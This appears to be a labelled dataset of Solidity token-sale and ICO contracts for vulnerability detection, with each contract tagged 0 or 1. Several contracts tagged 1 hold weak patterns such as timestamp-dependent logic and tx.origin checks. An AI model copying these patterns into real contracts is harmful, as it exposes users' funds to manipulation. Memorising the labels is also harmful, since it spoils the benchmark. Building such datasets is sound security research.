0<CODESPLIT>contract ICOPreSale is ICO {	 	constructor(address _SCEscrow, address _SCTokens, address _SCWhitelist, address _SCRefundVault) public {		if (_SCTokens == 0x0) {			revert('Tokens Constructor: _SCTokens == 0x0');		}		if (_SCWhitelist == 0x0) {			revert('Tokens Constructor: _SCWhitelist == 0x0');		}		if (_SCRefundVault == 0x0) {			revert('Tokens Constructor: _SCRefundVault == 0x0');		}				SCTokens = Tokens(_SCTokens);		SCWhitelist = Whitelist(_SCWhitelist);		SCRefundVault = RefundVault(_SCRefundVault);				weisPerEther = 1 ether;  		 		startTime = timestamp();		endTime = timestamp().add(24 days);  		 		bigTokensPerEther = 7500;  		tokensPerEther = bigTokensPerEther.mul(weisPerEther);  		discount = 45;  		discountedPricePercentage = 100;		discountedPricePercentage = discountedPricePercentage.sub(discount);		weisMinInvestment = weisPerEther.mul(1);		 		 		 		 		 		 		  		etherHardCap = 8067;  		tokensHardCap = tokensPerEther.mul(etherHardCap).mul(100).div(discountedPricePercentage);		weisPerBigToken = weisPerEther.div(bigTokensPerEther);		 		weisHardCap = weisPerEther.mul(etherHardCap);		 		etherSoftCap = 750;  		weisSoftCap = weisPerEther.mul(etherSoftCap);		SCEscrow = Escrow(_SCEscrow);		ICOStage = 0;	}}
1<CODESPLIT>contract Tokens is HardcodedWallets, ERC20, Haltable {	 	mapping (address => uint256) balances;	mapping (address => mapping (address => uint256)) allowed;	uint256 public _totalSupply; 	 	string public name;	string public symbol;	uint8 public decimals;	string public standard = 'H0.1';  	 	uint256 public timelockEndTime;	 	address public addressSCICO;	 	address public addressSCEscrow;	 	address public addressSCComplianceService;	ComplianceService public SCComplianceService;	 	 	modifier notTimeLocked() {		if (now < timelockEndTime && msg.sender != addressSCICO && msg.sender != addressSCEscrow) {			error('notTimeLocked: Timelock still active. Function is yet unavailable.');		} else {			_;		}	}	 	 	constructor(address _addressSCEscrow, address _addressSCComplianceService) public {		name = "TheRentalsToken";		symbol = "TRT";		decimals = 18;  		         _totalSupply = 1350000000 ether;  		timelockEndTime = timestamp().add(45 days);  		addressSCEscrow = _addressSCEscrow;		addressSCComplianceService = _addressSCComplianceService;		SCComplianceService = ComplianceService(addressSCComplianceService);		 		balances[_addressSCEscrow] = _totalSupply;		emit Transfer(0x0, _addressSCEscrow, _totalSupply);	}         function totalSupply() public constant returns (uint) {        return _totalSupply  - balances[address(0)];    }	 	function balanceOf(address _owner) public constant returns (uint256 balance) {		return balances[_owner];	}	 	function transfer(address _to, uint256 _amount) public notTimeLocked stopInEmergency returns (bool success) {		if (balances[msg.sender] < _amount) {			error('transfer: the amount to transfer is higher than your token balance');			return false;		}		if(!SCComplianceService.validate(msg.sender, _to, _amount)) {			error('transfer: not allowed by the compliance service');			return false;		}		balances[msg.sender] = balances[msg.sender].sub(_amount);		balances[_to] = balances[_to].add(_amount);		emit Transfer(msg.sender, _to, _amount);  		return true;	}	 	function transferFrom(address _from, address _to, uint256 _amount) public notTimeLocked stopInEmergency returns (bool success) {		if (balances[_from] < _amount) {			error('transferFrom: the amount to transfer is higher than the token balance of the source');			return false;		}		if (allowed[_from][msg.sender] < _amount) {			error('transferFrom: the amount to transfer is higher than the maximum token transfer allowed by the source');			return false;		}		if(!SCComplianceService.validate(_from, _to, _amount)) {			error('transfer: not allowed by the compliance service');			return false;		}		balances[_from] = balances[_from].sub(_amount);		balances[_to] = balances[_to].add(_amount);		allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);		emit Transfer(_from, _to, _amount);  		return true;	}	 	function approve(address _spender, uint256 _amount) public returns (bool success) {		allowed[msg.sender][_spender] = _amount;		emit Approval(msg.sender, _spender, _amount);  		return true;	}	 	function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {		return allowed[_owner][_spender];	}	 	function increaseApproval(address _spender, uint _addedValue) public returns (bool) {		allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);		emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);		return true;	}	 	function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {		uint oldValue = allowed[msg.sender][_spender];		if (_subtractedValue > oldValue) {			allowed[msg.sender][_spender] = 0;		} else {			allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);		}		emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);		return true;	}		 	function refundTokens(address _from, uint256 _amount) public notTimeLocked stopInEmergency returns (bool success) {        if (tx.origin != _from) {            error('refundTokens: tx.origin did not request the refund directly');            return false;        }        if (addressSCICO != msg.sender) {            error('refundTokens: caller is not the current ICO address');            return false;        }        if (balances[_from] < _amount) {            error('refundTokens: the amount to transfer is higher than your token balance');            return false;        }        if(!SCComplianceService.validate(_from, addressSCICO, _amount)) {			error('transfer: not allowed by the compliance service');			return false;		}		balances[_from] = balances[_from].sub(_amount);		balances[addressSCICO] = balances[addressSCICO].add(_amount);		emit Transfer(_from, addressSCICO, _amount);  		return true;	}	 	function setMyICOContract(address _SCICO) public onlyOwner {		addressSCICO = _SCICO;	}	function setComplianceService(address _addressSCComplianceService) public onlyOwner {		addressSCComplianceService = _addressSCComplianceService;		SCComplianceService = ComplianceService(addressSCComplianceService);	}	 	function updateTimeLock(uint256 _timelockEndTime) onlyOwner public returns (bool) {		timelockEndTime = _timelockEndTime;		emit UpdateTimeLock(_timelockEndTime);  		return true;	}	 	 	event Transfer(address indexed _from, address indexed _to, uint256 _amount);	 	event Approval(address indexed _owner, address indexed _spender, uint256 _amount);	 	event UpdateTimeLock(uint256 _timelockEndTime);}
1<CODESPLIT>contract BBTCToken {    uint64 private constant crowdSaleStart = 1526927400;      function currentTierDiscountPercentage() internal view returns (uint64) {          uint64 _now = uint64(block.timestamp);          if(_now > crowdSaleStart) return 0;          return 0;      }}
0<CODESPLIT>contract tipbotreg {    uint256 public stakeCommence;    uint256 public stakeMinAge;    uint256 public stakeMaxAge;    function mint() public returns (bool);    function coinAge() public payable returns (uint256);    function annualInterest() public view returns (uint256);    event Mint(address indexed _address, uint _reward);}    
1<CODESPLIT>contract tipbot is ERC20,tipbotreg,Ownable {        using SafeMath for uint256;        string public name = "tipbot";        string public symbol = "TIP";                uint public decimals = 18;                uint public stakeCommence;                  uint public stakeMinAge = 3 days;                  uint public stakeMaxAge = 90 days;                  uint public maxMintPoS = 10**17;                  uint public chainStartTime;                  uint public chainStartBlock;          uint public totalSupply;                uint public maxTIPSupply;                uint public initialTIPsupply;        struct transferInStruct{                uint256 amount;                uint64 time;    }        mapping(address => uint256) balances;                mapping(address => mapping (address => uint256)) allowed;                mapping(address => transferInStruct[]) transferIns;    event Burn(address indexed burner, uint256 value);         modifier onlyPayloadSize(uint size) {        require(msg.data.length >= size + 4);        _;    }    modifier canTIPMint() {        require(totalSupply < maxTIPSupply);        _;    }    function tipbot() public {                 initialTIPsupply = 104000000000000000000000000000;                      maxTIPSupply = 375000000000000000000000000000;                 chainStartTime = block.timestamp;        chainStartBlock = block.number;        balances[msg.sender] = initialTIPsupply;        totalSupply = initialTIPsupply;    }           function transfer(address _to, uint256 _value) public onlyPayloadSize(2 * 32) returns (bool) {        if(msg.sender == _to) return mint();        balances[msg.sender] = balances[msg.sender].sub(_value);        balances[_to] = balances[_to].add(_value);        emit Transfer(msg.sender, _to, _value);        if(transferIns[msg.sender].length > 0) delete transferIns[msg.sender];        uint64 _now = uint64(block.timestamp);        transferIns[msg.sender].push(transferInStruct(uint256(balances[msg.sender]),_now));        transferIns[_to].push(transferInStruct(uint256(_value),_now));        return true;    }           function balanceOf(address _owner) public view returns (uint256 balance) {        return balances[_owner];    }           function transferFrom(address _from, address _to, uint256 _value) public onlyPayloadSize(3 * 32) returns (bool) {        require(_to != address(0));        uint256 _allowance = allowed[_from][msg.sender];        balances[_from] = balances[_from].sub(_value);        balances[_to] = balances[_to].add(_value);        allowed[_from][msg.sender] = _allowance.sub(_value);        emit Transfer(_from, _to, _value);        if(transferIns[_from].length > 0) delete transferIns[_from];        uint64 _now = uint64(block.timestamp);        transferIns[_from].push(transferInStruct(uint256(balances[_from]),_now));        transferIns[_to].push(transferInStruct(uint256(_value),_now));        return true;    }         function ownerSetStakeCommence(uint timestamp) public onlyOwner {        require((stakeCommence <= 0) && (timestamp >= chainStartTime));        stakeCommence = timestamp;    }         function approve(address _spender, uint256 _value) public returns (bool) {        require((_value == 0) || (allowed[msg.sender][_spender] == 0));        allowed[msg.sender][_spender] = _value;        emit Approval(msg.sender, _spender, _value);        return true;    }            function allowance(address _owner, address _spender) public view returns (uint256 remaining) {        return allowed[_owner][_spender];    }        function mint() public canTIPMint returns (bool) {        if(balances[msg.sender] <= 0) return false;        if(transferIns[msg.sender].length <= 0) return false;        uint reward = getPoSReward(msg.sender);        if(reward <= 0) return false;        totalSupply = totalSupply.add(reward);        balances[msg.sender] = balances[msg.sender].add(reward);        delete transferIns[msg.sender];        transferIns[msg.sender].push(transferInStruct(uint256(balances[msg.sender]),uint64(block.timestamp)));        emit Mint(msg.sender, reward);        return true;    }    function getBlockNumber() public view returns (uint blockNumber) {        blockNumber = block.number.sub(chainStartBlock);    }         function coinAge() public payable returns (uint myCoinAge) {        myCoinAge = getCoinAge(msg.sender,block.timestamp);    }     function annualInterest() public view returns(uint interest) {        uint _now = block.timestamp;        interest = maxMintPoS;        if((_now.sub(stakeCommence)).div(365 days) == 0) {            interest = (770 * maxMintPoS).div(100);        } else if((_now.sub(stakeCommence)).div(365 days) == 1){            interest = (435 * maxMintPoS).div(100);        }    }     function getPoSReward(address _address) internal view returns (uint) {        require( (block.timestamp >= stakeCommence) && (stakeCommence > 0) );        uint _now = block.timestamp;        uint _coinAge = getCoinAge(_address, _now);        if(_coinAge <= 0) return 0;        uint interest = maxMintPoS;               if((_now.sub(stakeCommence)).div(365 days) == 0) {            interest = (770 * maxMintPoS).div(100);        } else if((_now.sub(stakeCommence)).div(365 days) == 1){                         interest = (435 * maxMintPoS).div(100);        }        return (_coinAge * interest).div(365 * (10**decimals));    }    function getCoinAge(address _address, uint _now) internal view returns (uint _coinAge) {        if(transferIns[_address].length <= 0) return 0;        for (uint i = 0; i < transferIns[_address].length; i++){            if( _now < uint(transferIns[_address][i].time).add(stakeMinAge) ) continue;            uint nCoinSeconds = _now.sub(uint(transferIns[_address][i].time));            if( nCoinSeconds > stakeMaxAge ) nCoinSeconds = stakeMaxAge;            _coinAge = _coinAge.add(uint(transferIns[_address][i].amount) * nCoinSeconds.div(1 days));        }    }       function batchTransfer(address[] _recipients, uint[] _values) public onlyOwner returns (bool) {        require( _recipients.length > 0 && _recipients.length == _values.length);        uint total = 0;        for(uint i = 0; i < _values.length; i++){            total = total.add(_values[i]);        }        require(total <= balances[msg.sender]);        uint64 _now = uint64(block.timestamp);        for(uint j = 0; j < _recipients.length; j++){            balances[_recipients[j]] = balances[_recipients[j]].add(_values[j]);            transferIns[_recipients[j]].push(transferInStruct(uint256(_values[j]),_now));            emit Transfer(msg.sender, _recipients[j], _values[j]);        }        balances[msg.sender] = balances[msg.sender].sub(total);        if(transferIns[msg.sender].length > 0) delete transferIns[msg.sender];        if(balances[msg.sender] > 0) transferIns[msg.sender].push(transferInStruct(uint256(balances[msg.sender]),_now));        return true;    }             function TokenBurn(uint _value) public onlyOwner {        require(_value > 0);        balances[msg.sender] = balances[msg.sender].sub(_value);        delete transferIns[msg.sender];        transferIns[msg.sender].push(transferInStruct(uint256(balances[msg.sender]),uint64(block.timestamp)));        totalSupply = totalSupply.sub(_value);        initialTIPsupply = initialTIPsupply.sub(_value);        maxTIPSupply = maxTIPSupply.sub(_value*10);        emit Burn(msg.sender, _value);    }   }
0<CODESPLIT>contract KOIOSToken is StandardToken, Ownable {	using SafeMath for uint256;	string public name = "KOIOS";	string public symbol = "KOI";	uint256 public decimals = 5;	uint256 public totalSupply = 1000000000 * (10 ** uint256(decimals));	 	function KOIOSToken(string _name, string _symbol, uint256 _decimals, uint256 _totalSupply) public {		name = _name;		symbol = _symbol;		decimals = _decimals;		totalSupply = _totalSupply;		totalSupply_ = _totalSupply;		balances[msg.sender] = totalSupply;	}	 	function () public payable {		revert();	}} 
1<CODESPLIT>contract KOIOSTokenSale is Ownable {	using SafeMath for uint256;	 	KOIOSToken public token;	 	uint256 public startingTimestamp = 1518696000;	 	uint256 public endingTimestamp = 1521115200;	 	uint256 public tokenPriceInEth = 0.0001 ether;	 	uint256 public tokensForSale = 400000000 * 1E5;	 	uint256 public totalTokenSold;	 	uint256 public totalEtherRaised;	 	mapping(address => uint256) public etherRaisedPerWallet;	 	address public wallet;	 	bool internal isClose = false;	 	event WalletChange(address _wallet, uint256 _timestamp);	 	event TokenPurchase(address indexed _purchaser, address indexed _beneficiary, uint256 _value, uint256 _amount, uint256 _timestamp);	 	event TransferManual(address indexed _from, address indexed _to, uint256 _value, string _message);	 	function KOIOSTokenSale(address _token, uint256 _startingTimestamp, uint256 _endingTimestamp, uint256 _tokensPerEth, uint256 _tokensForSale, address _wallet) public {		 		token = KOIOSToken(_token);		startingTimestamp = _startingTimestamp;		endingTimestamp = _endingTimestamp;		tokenPriceInEth =  1E18 / _tokensPerEth;  		tokensForSale = _tokensForSale;		 		wallet = _wallet;	}	 	function isValidPurchase(uint256 value, uint256 amount) internal constant returns (bool) {		 		bool validTimestamp = startingTimestamp <= block.timestamp && endingTimestamp >= block.timestamp;		 		bool validValue = value != 0;		 		bool validRate = tokenPriceInEth > 0;		 		bool validAmount = tokensForSale.sub(totalTokenSold) >= amount && amount > 0;		 		return validTimestamp && validValue && validRate && validAmount && !isClose;	}		 	function calculate(uint256 value) public constant returns (uint256) {		uint256 tokenDecimals = token.decimals();		uint256 tokens = value.mul(10 ** tokenDecimals).div(tokenPriceInEth);		return tokens;	}		 	function() public payable {		buyTokens(msg.sender);	}	 	function buyTokens(address beneficiary) public payable {		require(beneficiary != address(0));		 		uint256 value = msg.value;		 		uint256 tokens = calculate(value);		 		require(isValidPurchase(value , tokens));		 		totalTokenSold = totalTokenSold.add(tokens);		totalEtherRaised = totalEtherRaised.add(value);		etherRaisedPerWallet[msg.sender] = etherRaisedPerWallet[msg.sender].add(value);		 		token.transfer(beneficiary, tokens);				 		TokenPurchase(msg.sender, beneficiary, value, tokens, now);	}	 	function transferManual(address _to, uint256 _value, string _message) onlyOwner public returns (bool) {		require(_to != address(0));		 		token.transfer(_to , _value);		TransferManual(msg.sender, _to, _value, _message);		return true;	}	 		function setWallet(address _wallet) onlyOwner public returns(bool) {		 		wallet = _wallet;		WalletChange(_wallet , now);		return true;	}	 	function withdraw() onlyOwner public {		wallet.transfer(this.balance);	}	 		function close() onlyOwner public {		 		uint256 tokens = token.balanceOf(this); 		token.transfer(owner , tokens);		 		withdraw();		 		isClose = true;	}} 
1<CODESPLIT>contract KOIOSTokenPreSale is Ownable {	using SafeMath for uint256;	 	KOIOSToken public token;	 	uint256 public startingTimestamp = 1527811200;	 	uint256 public endingTimestamp = 1528156799;	 	uint256 public tokenPriceInEth = 0.00005 ether;	 	uint256 public tokensForSale = 400000000 * 1E5;	 	uint256 public totalTokenSold;	 	uint256 public totalEtherRaised;	 	mapping(address => uint256) public etherRaisedPerWallet;	 	address public wallet;	 	bool internal isClose = false;	 	event WalletChange(address _wallet, uint256 _timestamp);	 	event TokenPurchase(address indexed _purchaser, address indexed _beneficiary, uint256 _value, uint256 _amount, uint256 _timestamp);	 	event TransferManual(address indexed _from, address indexed _to, uint256 _value, string _message);	 	mapping(address => uint256) public lockupPhase1;	uint256 public phase1Duration = 90 * 86400;	 	mapping(address => uint256) public lockupPhase2;	uint256 public phase2Duration = 120 * 86400;		 	mapping(address => uint256) public lockupPhase3;	uint256 public phase3Duration = 150 * 86400;		 	mapping(address => uint256) public lockupPhase4;	uint256 public phase4Duration = 180 * 86400;	uint256 public totalLockedBonus; 	 	function KOIOSTokenPreSale(address _token, uint256 _startingTimestamp, uint256 _endingTimestamp, uint256 _tokensPerEth, uint256 _tokensForSale, address _wallet) public {		 		token = KOIOSToken(_token);		startingTimestamp = _startingTimestamp;		endingTimestamp = _endingTimestamp;		tokenPriceInEth =  1E18 / _tokensPerEth;  		tokensForSale = _tokensForSale;		 		wallet = _wallet;	}	 	function isValidPurchase(uint256 value, uint256 amount) internal constant returns (bool) {		 		bool validTimestamp = startingTimestamp <= block.timestamp && endingTimestamp >= block.timestamp;		 		bool validValue = value != 0;		 		bool validRate = tokenPriceInEth > 0;		 		bool validAmount = tokensForSale.sub(totalTokenSold) >= amount && amount > 0;		 		return validTimestamp && validValue && validRate && validAmount && !isClose;	}	function getBonus(uint256 _value) internal pure returns (uint256) {		uint256 bonus = 0; 		if(_value >= 1E18) {			bonus = _value.mul(50).div(1000);		}if(_value >= 5E18) {			bonus = _value.mul(75).div(1000);		}if(_value >= 10E18) {			bonus = _value.mul(100).div(1000);		}if(_value >= 20E18) {			bonus = _value.mul(150).div(1000);		}if(_value >= 30E18) {			bonus = _value.mul(200).div(1000);		}		return bonus;	}		 	function calculate(uint256 value) public constant returns (uint256) {		uint256 tokenDecimals = token.decimals();		uint256 tokens = value.mul(10 ** tokenDecimals).div(tokenPriceInEth);		return tokens;	}	function lockBonus(address _sender, uint bonusTokens) internal returns (bool) {		uint256 lockedBonus = bonusTokens.div(4);		lockupPhase1[_sender] = lockupPhase1[_sender].add(lockedBonus);		lockupPhase2[_sender] = lockupPhase2[_sender].add(lockedBonus);		lockupPhase3[_sender] = lockupPhase3[_sender].add(lockedBonus);		lockupPhase4[_sender] = lockupPhase4[_sender].add(lockedBonus);		totalLockedBonus = totalLockedBonus.add(bonusTokens);		return true;	}			 	function() public payable {		buyTokens(msg.sender);	}	 	function buyTokens(address beneficiary) public payable {		require(beneficiary != address(0));		 		uint256 _value = msg.value;		 		uint256 tokens = calculate(_value);		 		uint256 bonusTokens = calculate(getBonus(_value));		lockBonus(beneficiary, bonusTokens);		uint256 _totalTokens = tokens.add(bonusTokens);            		 		require(isValidPurchase(_value , _totalTokens));		 		totalTokenSold = totalTokenSold.add(_totalTokens);		totalEtherRaised = totalEtherRaised.add(_value);		etherRaisedPerWallet[msg.sender] = etherRaisedPerWallet[msg.sender].add(_value);		 		token.transfer(beneficiary, tokens);				 		TokenPurchase(msg.sender, beneficiary, _value, tokens, now);	}	function isValidRelease(uint256 amount) internal constant returns (bool) {		 		bool validAmount = amount > 0;		 		return validAmount;	}	function releaseBonus() public {		uint256 releaseTokens = 0;		if(block.timestamp > (startingTimestamp.add(phase1Duration)))		{			releaseTokens = releaseTokens.add(lockupPhase1[msg.sender]);			lockupPhase1[msg.sender] = 0;		}		if(block.timestamp > (startingTimestamp.add(phase2Duration)))		{			releaseTokens = releaseTokens.add(lockupPhase2[msg.sender]);			lockupPhase2[msg.sender] = 0;		}		if(block.timestamp > (startingTimestamp.add(phase3Duration)))		{			releaseTokens = releaseTokens.add(lockupPhase3[msg.sender]);			lockupPhase3[msg.sender] = 0;		}		if(block.timestamp > (startingTimestamp.add(phase4Duration)))		{			releaseTokens = releaseTokens.add(lockupPhase4[msg.sender]);			lockupPhase4[msg.sender] = 0;		}		 		totalLockedBonus = totalLockedBonus.sub(releaseTokens);		token.transfer(msg.sender, releaseTokens);	}	function releasableBonus(address _owner) public constant returns (uint256) {		uint256 releaseTokens = 0;		if(block.timestamp > (startingTimestamp.add(phase1Duration)))		{			releaseTokens = releaseTokens.add(lockupPhase1[_owner]);		}		if(block.timestamp > (startingTimestamp.add(phase2Duration)))		{			releaseTokens = releaseTokens.add(lockupPhase2[_owner]);		}		if(block.timestamp > (startingTimestamp.add(phase3Duration)))		{			releaseTokens = releaseTokens.add(lockupPhase3[_owner]);		}		if(block.timestamp > (startingTimestamp.add(phase4Duration)))		{			releaseTokens = releaseTokens.add(lockupPhase4[_owner]);		}		return releaseTokens;			}	 	function transferManual(address _to, uint256 _value, string _message) onlyOwner public returns (bool) {		require(_to != address(0));		 		token.transfer(_to , _value);		TransferManual(msg.sender, _to, _value, _message);		return true;	}	 		function setWallet(address _wallet) onlyOwner public returns(bool) {		 		wallet = _wallet;		WalletChange(_wallet , now);		return true;	}	 	function withdraw() onlyOwner public {		wallet.transfer(this.balance);	}	 		function close() onlyOwner public {		 		uint256 tokens = token.balanceOf(this).sub(totalLockedBonus); 		token.transfer(owner , tokens);		 		withdraw();		 		isClose = true;	}}
1<CODESPLIT>contract StageCrowdsale is FinalizableCrowdsale {    bool public previousStageIsFinalized = false;    StageCrowdsale public previousStage;    constructor(        uint256 _rate,        address _wallet,        ERC20 _token,        uint256 _openingTime,        uint256 _closingTime,        StageCrowdsale _previousStage    )        public        Crowdsale(_rate, _wallet, _token)        TimedCrowdsale(_openingTime, _closingTime)    {        previousStage = _previousStage;        if (_previousStage == address(0)) {            previousStageIsFinalized = true;        }    }    modifier isNotFinalized() {        require(!isFinalized, "Call on finalized.");        _;    }    modifier previousIsFinalized() {        require(isPreviousStageFinalized(), "Call on previous stage finalized.");        _;    }    function finalizeStage() public onlyOwner isNotFinalized {        _finalizeStage();    }    function proxyBuyTokens(address _beneficiary) public payable {        uint256 weiAmount = msg.value;        _preValidatePurchase(_beneficiary, weiAmount);                 uint256 tokens = _getTokenAmount(weiAmount);                 weiRaised = weiRaised.add(weiAmount);        _processPurchase(_beneficiary, tokens);                 emit TokenPurchase(tx.origin, _beneficiary, weiAmount, tokens);        _updatePurchasingState(_beneficiary, weiAmount);        _forwardFunds();        _postValidatePurchase(_beneficiary, weiAmount);    }    function isPreviousStageFinalized() public returns (bool) {        if (previousStageIsFinalized) {            return true;        }        if (previousStage.isFinalized()) {            previousStageIsFinalized = true;        }        return previousStageIsFinalized;    }    function _finalizeStage() internal isNotFinalized {        finalization();        emit Finalized();        isFinalized = true;    }    function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal isNotFinalized previousIsFinalized {        super._preValidatePurchase(_beneficiary, _weiAmount);    }} 
0<CODESPLIT>contract MultiStageCrowdsale is Ownable {    uint256 public currentStageIndex = 0;    StageCrowdsale[] public stages;    event StageAdded();    function () external payable {        buyTokens(msg.sender);    }    modifier hasCurrentStage() {        require(currentStageIndex < stages.length);        _;    }    modifier validBuyCall(address _beneficiary) {        require(_beneficiary != address(0));        require(msg.value != 0);        _;    }    function addStageCrowdsale(address _stageCrowdsaleAddress) public onlyOwner {        require(_stageCrowdsaleAddress != address(0));        StageCrowdsale stageToBeAdded = StageCrowdsale(_stageCrowdsaleAddress);        if (stages.length > 0) {            require(stageToBeAdded.previousStage() != address(0));            StageCrowdsale lastStage = stages[stages.length - 1];            require(stageToBeAdded.openingTime() >= lastStage.closingTime());        }        stages.push(stageToBeAdded);        emit StageAdded();    }    function buyTokens(address _beneficiary) public payable validBuyCall(_beneficiary) hasCurrentStage {        StageCrowdsale stage = updateCurrentStage();        stage.proxyBuyTokens.value(msg.value)(_beneficiary);        updateCurrentStage();    }    function getCurrentStage() public view returns (StageCrowdsale) {        if (stages.length > 0) {            return stages[currentStageIndex];        }    }    function updateCurrentStage() public returns (StageCrowdsale currentStage) {        if (currentStageIndex < stages.length) {            currentStage = stages[currentStageIndex];            while (currentStage.isFinalized() && currentStageIndex + 1 < stages.length) {                currentStage = stages[++currentStageIndex];            }        }    }}
0<CODESPLIT>contract CappedStageCrowdsale is CappedCrowdsale, StageCrowdsale {    using SafeMath for uint256;         function weiToCap() public view returns (uint256) {        return cap.sub(weiRaised);    }    function _postValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {        super._postValidatePurchase(_beneficiary, _weiAmount);        if (weiRaised >= cap) {            _finalizeStage();        }    }}  
0<CODESPLIT>contract LimitedMinPurchaseCrowdsale is Crowdsale {    using SafeMath for uint256;         uint256 public minPurchase;         constructor(uint256 _minPurchase) public {        require(            _minPurchase > 0,            "Call with insufficient _minPurchase."        );        minPurchase = _minPurchase;    }    modifier overMinPurchaseLimit(uint256 _weiAmount) {        require(            _weiAmount >= minPurchase,            "Call with insufficient _weiAmount."        );        _;    }         function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal overMinPurchaseLimit(_weiAmount) {        super._preValidatePurchase(_beneficiary, _weiAmount);    }} 
0<CODESPLIT>contract TokensSoldCountingCrowdsale is Crowdsale {    using SafeMath for uint256;    uint256 public tokensSoldCount;         function _updatePurchasingState(        address _beneficiary,        uint256 _weiAmount    )    internal    {        uint256 tokens = _getTokenAmount(_weiAmount);        tokensSoldCount = tokensSoldCount.add(tokens);    }}  
0<CODESPLIT>contract ManualTokenDistributionCrowdsale is Crowdsale, Ownable, TokensSoldCountingCrowdsale {        using SafeMath for uint256;         event TokenAssignment(address indexed beneficiary, uint256 amount);         function manualSendTokens(address _beneficiary, uint256 _tokensAmount) public  onlyOwner {        require(_beneficiary != address(0));        require(_tokensAmount > 0);        super._deliverTokens(_beneficiary, _tokensAmount);        tokensSoldCount = tokensSoldCount.add(_tokensAmount);        emit TokenAssignment(_beneficiary, _tokensAmount);    }}  
0<CODESPLIT>contract RefundableStageCrowdsale is RefundableCrowdsale {         function _forwardFunds() internal {                 vault.deposit.value(msg.value)(tx.origin);    }}  library Roles {  struct Role {    mapping (address => bool) bearer;  }     function add(Role storage role, address addr)    internal  {    role.bearer[addr] = true;  }     function remove(Role storage role, address addr)    internal  {    role.bearer[addr] = false;  }     function check(Role storage role, address addr)    view    internal  {    require(has(role, addr));  }     function has(Role storage role, address addr)    view    internal    returns (bool)  {    return role.bearer[addr];  }}  
0<CODESPLIT>contract BlockFollowMainStageCrowdsale is StageCrowdsale, CappedStageCrowdsale, LimitedMinPurchaseCrowdsale,    ManualTokenDistributionCrowdsale, PausableCrowdsale, RefundableStageCrowdsale, WhitelistedCrowdsale {    using SafeMath for uint256;    mapping (address => bool) public claimedBonus;    uint256 public ratePerEth;    uint256 public bonusTokensPool;    uint256 public burnPercentage;    uint256 public totalTokensSold;    uint256 purchasableTokenSupply;    constructor(        address _wallet,        ERC20 _token,        uint256 _openingTime,        StageCrowdsale _previousStage,        uint256 _ratePerEth,        uint256 _minPurchase,        uint256 _minCap,        uint256 _maxCap,        uint256 _burnPercentage,        uint256 _purchasableTokenSupply,        Whitelist _whitelist    )        public        CappedCrowdsale(_maxCap)        LimitedMinPurchaseCrowdsale(_minPurchase)        StageCrowdsale(_ratePerEth, _wallet, _token, _openingTime, _openingTime + 4 weeks, _previousStage)        RefundableCrowdsale(_minCap)        WhitelistedCrowdsale(_whitelist)    {        require(_ratePerEth > 0, "Rate per ETH cannot be null");        require(_burnPercentage > 0, "Burn percenatage cannot be null");        require(_purchasableTokenSupply > 0, "Purchasable token supply cannot be null");        ratePerEth = _ratePerEth;        burnPercentage = _burnPercentage;        purchasableTokenSupply = _purchasableTokenSupply;    }         modifier canClaimBonus() {        require(isFinalized, "Cannot claim bonus when stage is not yet finalized");                 require(now < openingTime + 6 weeks, "Cannot claim bonus tokens too soon");        require(!claimedBonus[msg.sender], "Cannot claim bonus tokens repeatedly");        require(totalTokensSold > 0, "Cannot claim bonus tokens when no purchase have been made");        _;    }         function claimBonusTokens() public canClaimBonus {        uint256 senderBalance = token.balanceOf(msg.sender);        uint256 purchasedProportion = senderBalance.mul(1e18).div(totalTokensSold);        uint256 bonusForSender = bonusTokensPool.mul(purchasedProportion).div(1e18);        token.transfer(msg.sender, bonusForSender);        claimedBonus[msg.sender] = true;    }         function claimRemainingTokens() public onlyOwner {        uint256 balance = token.balanceOf(this);        manualSendTokens(msg.sender, balance);    }         function finalization() internal {        super.finalization();        uint256 balance = token.balanceOf(address(this));        totalTokensSold = purchasableTokenSupply.sub(balance);        uint256 balanceToBurn = balance.mul(burnPercentage).div(100);        BurnableToken(address(token)).burn(balanceToBurn);        uint256 bonusPercentage = 100 - burnPercentage;        bonusTokensPool = balance.mul(100).mul(bonusPercentage).div(1e4);    }        function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) {        return _weiAmount.div(1e10).mul(ratePerEth);    }}
1<CODESPLIT>contract SwarmVotingMVP {    bytes32 public ballotEncryptionSeckey;    bool seckeyRevealed = false;    uint256 public endTime;    function revealSeckey(bytes32 _secKey) public {        require(block.timestamp > endTime);        ballotEncryptionSeckey = _secKey;        seckeyRevealed = true;        return;    }}
0<CODESPLIT>contract TokensRollStageCrowdsale is FinalizableCrowdsale {         address public rollAddress;         modifier havingRollAddress() {        require(rollAddress != address(0), "Call when no roll address set.");        _;    }         function finalization() internal havingRollAddress {        super.finalization();        token.transfer(rollAddress, token.balanceOf(this));    }         function setRollAddress(address _rollAddress) public onlyOwner {        require(_rollAddress != address(0), "Call with invalid _rollAddress.");        rollAddress = _rollAddress;    }}  library Roles {  struct Role {    mapping (address => bool) bearer;  }     function add(Role storage role, address addr)    internal  {    role.bearer[addr] = true;  }     function remove(Role storage role, address addr)    internal  {    role.bearer[addr] = false;  }     function check(Role storage role, address addr)    view    internal  {    require(has(role, addr));  }     function has(Role storage role, address addr)    view    internal    returns (bool)  {    return role.bearer[addr];  }}  
0<CODESPLIT>contract BlockFollowPreSaleStageCrowdsale is StageCrowdsale, CappedStageCrowdsale, TokensRollStageCrowdsale,    ManualTokenDistributionCrowdsale, PausableCrowdsale, WhitelistedCrowdsale {    uint256 public ratePerEth;    constructor(        address _wallet,        ERC20 _token,        uint256 _openingTime,        uint256 _ratePerEth,        uint256 _maxCap,        Whitelist _whitelist    )        public        CappedCrowdsale(_maxCap)        StageCrowdsale(_ratePerEth, _wallet, _token, _openingTime, _openingTime + 2 weeks, StageCrowdsale(address(0)))        WhitelistedCrowdsale(_whitelist)    {        require(_ratePerEth > 0, "Rate per ETH cannot be null");        ratePerEth = _ratePerEth;    }        function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) {        return _weiAmount.div(1e10).mul(ratePerEth);    }}
